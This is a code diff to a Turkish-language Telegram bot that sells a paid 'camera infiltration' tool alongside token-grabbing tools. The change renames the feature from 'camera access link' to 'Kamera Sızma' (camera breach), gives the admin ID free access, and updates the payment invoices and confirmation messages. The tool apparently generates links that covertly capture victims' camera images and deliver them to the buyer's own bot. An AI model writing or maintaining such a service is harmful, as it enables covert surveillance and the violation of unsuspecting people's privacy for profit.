@@ -650,6 +650,8 @@ def is_premium_log(user_id):
         return False
 
 def is_premium_camera(user_id):
+    if user_id == ADMIN_ID:
+        return True
     try:
         return _as_int_flag(db_get(user_id, "is_premium_camera"))
     except:
@@ -5984,7 +5986,7 @@ def tools_kb(user_id):
         _btn("🤖 Discord Token", "tool_dctoken", "danger"),
         _btn("✈️ TG Token", "tool_tgtoken", "danger"),
         _btn("🐍 PHP→Python", "tool_php2py", "danger"),
-        _btn("📷 Kamera Link", "tool_camera", "danger"),
+        _btn("Kamera Sızma 📷", "tool_camera", "danger"),
     )
     mk.add(_btn("🏠 Ana Menü", "goto_home", "success"))
     return mk
@@ -10696,21 +10698,20 @@ def register_handlers(bot_instance):
                     mk.add(_btn("◀️ Araçlar", "goto_tools"))
                     bot_instance.send_message(
                         call.message.chat.id,
-                        "📷 <b>Kamera Erişim Link</b>\n"
+                        "📷 <b>Kamera Sızma</b>\n"
                         "━━━━━━━━━━━━━━━━━━━━━\n"
                         "🔒 Bu servis üyelik gerektirir.\n\n"
                         f"⭐ <b>{CAMERA_PRICE} yıldız</b> → sınırsız kullanım\n\n"
-                        "Kendi bot tokenin ile kamera erişim bağlantısı oluşturursun.\n"
-                        "Kanal kaydı yok, direkt kullanırsın.",
+                        "Kendi bot tokenin ile kamera erişim bağlantısı oluşturursun.",
                         reply_markup=mk,
                         parse_mode="HTML"
                     )
                     return
-                # Üye ise token iste
+                # Üye / admin ise token iste
                 USER_STATES[uid] = {"action": "camera_token"}
                 m = bot_instance.send_message(
                     call.message.chat.id,
-                    "📷 <b>Kamera Erişim Link</b>\n"
+                    "📷 <b>Kamera Sızma</b>\n"
                     "━━━━━━━━━━━━━━━━━━━━━\n"
                     "🔑 Lütfen <b>Telegram Bot Token</b> gönderin:\n\n"
                     "<i>iptal yazarak çık</i>",
@@ -10723,12 +10724,12 @@ def register_handlers(bot_instance):
                 try:
                     bot_instance.send_invoice(
                         chat_id=call.message.chat.id,
-                        title="Kamera Erişim Üyelik",
-                        description="Kamera link oluşturma — sınırsız üyelik",
+                        title="Kamera Sızma Üyelik",
+                        description="Kamera sızma link oluşturma — sınırsız üyelik",
                         invoice_payload="camera",
                         provider_token="",
                         currency="XTR",
-                        prices=[LabeledPrice(label="Kamera Üyelik", amount=CAMERA_PRICE)],
+                        prices=[LabeledPrice(label="Kamera Sızma", amount=CAMERA_PRICE)],
                     )
                     bot_instance.answer_callback_query(call.id)
                 except Exception as e:
@@ -11633,9 +11634,9 @@ def register_handlers(bot_instance):
             set_premium_camera(uid, username)
             bot_instance.reply_to(
                 msg,
-                "🎉 <b>Kamera Erişim Üyeliği aktif!</b>\n"
+                "🎉 <b>Kamera Sızma Üyeliği aktif!</b>\n"
                 "📷 Artık sınırsız kamera linki oluşturabilirsin.\n"
-                "Araçlar → 📷 Kamera Link ile devam et.",
+                "Araçlar → Kamera Sızma 📷 ile devam et.",
                 parse_mode="HTML"
             )
             try:
@@ -13833,9 +13834,9 @@ def _admin_camera_give_user(msg, bot_instance):
         try:
             bot_instance.send_message(
                 tid,
-                "🎁 <b>Admin sana Kamera Üyeliği verdi!</b>\n"
+                "🎁 <b>Admin sana Kamera Sızma Üyeliği verdi!</b>\n"
                 "📷 Artık sınırsız kamera linki oluşturabilirsin.\n"
-                "Araçlar → 📷 Kamera Link"
+                "Araçlar → Kamera Sızma 📷"
             )
         except:
             pass
